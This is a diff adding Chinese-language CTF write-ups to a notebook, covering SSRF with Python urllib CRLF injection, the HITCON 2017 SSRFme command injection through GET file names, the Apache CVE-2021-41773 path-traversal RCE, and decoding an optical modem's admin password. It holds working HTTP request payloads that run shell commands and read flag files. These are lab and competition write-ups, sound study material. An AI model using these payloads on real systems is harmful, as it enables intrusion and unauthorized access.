@@ -8027,6 +8027,12 @@ getUrl?url=file://𝐒uctf.cc/../../../../../../usr/fffffflag
 ## 高校网络安全管理运维赛 pyssrf
 
 > 考点：SSRF + Redis + python pickle 反序列化
+>
+> 官方wp：链接：https://pan.baidu.com/s/1Vj1cFEUiHK1tGEvzrRfWyQ?pwd=hlf6  提取码：hlf6
+>
+> CVE-2019-9947 漏洞参考：https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/#0x04-CVE-2019-9947
+
+看了官方wp才知道python3.7，使用的urllib存在http头注入的问题，用这个漏洞（CVE2019-9947）
 
 ### CRLF HTTP 注入
 
@@ -8159,6 +8165,8 @@ def source():
 if __name__ == '__main__':
     app.run(debug=True, host="0.0.0.0")
 ```
+
+**Tips：**后面看了官方的WP感觉好复杂，是通过手戳opcode的方式先创建`static`文件夹，再将`flag`文件重定向写入`static`文件夹内，最后再直接访问这个文件拿到flag
 
 解题思路：首先可以确定的是利用`loads`做反序列化RCE，但是反序列化的字符串`b64res`是通过` urllib.request.urlopen(url)`获取的，所以这里看起来貌似`b64res`是不可控的！矛盾点就在这里！！！需要想办法去控制`b64res`的值
 
@@ -8797,7 +8805,71 @@ $phar->stopBuffering();    //签名自动计算
 
 ![image-20240508212350344](CTF.assets/image-20240508212350344.png)
 
+## BUUOJ [HITCON 2017]SSRFme
 
+### 1. 前置知识：GET 命令漏洞
+
+首先 GET 命令是可以**读取文件和目录**的！
+
+![image-20240509130516600](CTF.assets/image-20240509130516600.png)
+
+![image-20240509130531109](CTF.assets/image-20240509130531109.png)
+
+GET底层实现使用的是open函数，而open函数可以执行命令，所以我们可以用GET来执行命令（Ubuntu 18.04 已经修复此漏洞），在Kali做不出来，但是在BUUOJ的靶机上可以
+
+```
+输入：
+	?url=&filename=id|
+	?url=file:id|&filename=999
+访问：/sandbox/9bf75b83c5854fdd2e7b66cfe377b9ff/999
+```
+
+![image-20240509131109397](CTF.assets/image-20240509131109397.png)
+
+### 2. 例题
+
+```php
+<?php
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+}
+
+echo $_SERVER["REMOTE_ADDR"];		// 输出公网IP
+
+$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);		// 沙箱目录为：md5('orange' . '公网IP地址')
+@mkdir($sandbox);
+@chdir($sandbox);
+
+$data = shell_exec("GET " . escapeshellarg($_GET["url"]));			// GET 命令漏洞
+$info = pathinfo($_GET["filename"]);								// 获取文件路径信息，返回数组
+$dir = str_replace(".", "", basename($info["dirname"]));			// 获取目录名（可以为空）
+@mkdir($dir);
+@chdir($dir);
+@file_put_contents(basename($info["basename"]), $data);				// 将GET的结果写入 $data
+highlight_file(__FILE__);
+```
+
+首先，利用GET读取`\`目录
+
+```
+输入：?url=/&filename=00
+访问：/sandbox/9bf75b83c5854fdd2e7b66cfe377b9ff/00
+```
+
+能看到有一个`flag`和`readflag`文件，那么需要想办法执行`readflag`
+
+![image-20240509131726739](CTF.assets/image-20240509131726739.png)
+
+```
+payload：
+	输入：
+		?url=&filename=bash -c /readflag|
+		?url=file:bash -c /readflag|&filename=aaa
+	访问：/sandbox/9bf75b83c5854fdd2e7b66cfe377b9ff/aaa
+```
+
+![image-20240509131856646](CTF.assets/image-20240509131856646.png)
 
 
 
@@ -8910,6 +8982,134 @@ Hello, but what you're looking for isn't me.
 这里很明显就是一个压缩包的明文攻击了！（明文攻击主要利用大于 12 字节的一段已知明文数据进行攻击，从而获取整个加密文档的数据。）
 
 ![image-20240507001752028](CTF.assets/image-20240507001752028.png)
+
+## 高效网络安全管理运维赛 Apache - 复现
+
+> 附件地址：链接：https://pan.baidu.com/s/1VWHO8OuM6jRl8--xU-0OpA?pwd=by66  提取码：by66
+
+### 1. 前置知识
+
+根据附件得知 FROM httpd:2.4.49-buster， 存在 CVE-2021-41773 ，使用路径穿越的方式 RCE获得flag。
+
+> Apache HTTP Server 是 Apache 基础开放的流行的 HTTP 服务器。在其 2.4.49 版本中，引入了一个路径体验，满足下面两个条件的 Apache 服务器将受到影响：
+>
+> 1、版本等于2.4.49
+> 		2、Require all granted（默认情况下是允许被访问的）。
+>
+> 攻击者利用这个漏洞，可以读取到Apache服务器Web目录以外的其他文件，或者读取Web中的脚本源码，或者在开启cgi或cgid的服务器上执行任意命令。
+
+CVE-2021-41773 的靶场在vulnhub中已经搭建好，在`httpd`文件夹中，直接`docker-compose up -d`启动就好，复现如下：
+
+![image-20240508233412590](CTF.assets/image-20240508233412590.png)
+
+```
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: 192.168.231.153:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 7
+
+echo;ls
+```
+
+### 2. 例题复现
+
+进入给出源码
+
+```py
+from flask import Flask,request,send_file
+import socket
+
+app = Flask("webserver")
+
+# 访问 / 给出源码
+@app.route('/',methods=["GET"])
+def index():
+    return send_file(__file__)
+
+# POST 访问 nc 并传入 port 和 data 利用 socket 访问
+@app.route('/nc',methods=["POST"])
+def nc():
+    try:
+        # 获取端口号
+        dstport=int(request.form['port'])
+        # 获取数据
+        data=request.form['data']
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        # 发起 TCP 链接
+        s.connect(('127.0.0.1', dstport))
+        # 接收数据
+        s.send(data.encode())
+        recvdata = b''
+        while True:
+            chunk = s.recv(2048)
+            if not chunk.strip():
+                break
+            else:
+                recvdata += chunk
+                continue
+        return recvdata
+    except Exception as e:
+        return str(e)
+
+
+app.run(host="0.0.0.0",port=8080,threaded=True)
+```
+
+根据附件得知 FROM httpd:2.4.49-buster， 存在 CVE-2021-41773 ，使用路径穿越的方式 RCE获得flag。
+
+```http
+POST /nc HTTP/2
+Host: prob01-jjusirad.contest.pku.edu.cn
+Content-Length: 444
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="port"
+
+80
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="data"
+
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: aaaa
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 45
+Content-Type: application/x-www-form-urlencoded
+
+echo Content-Type:text/plain; echo; cat /flag;
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+```
+
+![image-20240508233907263](CTF.assets/image-20240508233907263.png)
+
+### 高效网络安全管理运维赛 Gatway - 复现
+
+> 附件地址：链接：https://pan.baidu.com/s/1axQgHvQRiKIeo6czq8347Q?pwd=ki38  提取码：ki38
+
+下载能拿到一个光猫的配置文件，里面有一个文件叫做`baseinfoSet.json`，里面`baseinfoSet_TELECOMPASSWORD`记录着超级管理员的账号密码，破解这个密码即可，官方说法和脚本如下：
+
+浏览器搜索： baseinfoSet_TELECOMPASSWORD ，可以找到数个对该算法的解释与解密脚 本，选择其中之一即可解密成功。
+
+```py
+orig = '106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129&'
+l = list(map(int, orig.split('&')[:-1]))
+result = []
+for i in l:
+    if i > 57:
+        i -= 4
+    result.append(chr(i))
+print(''.join(result))
+
+```
 
 
 
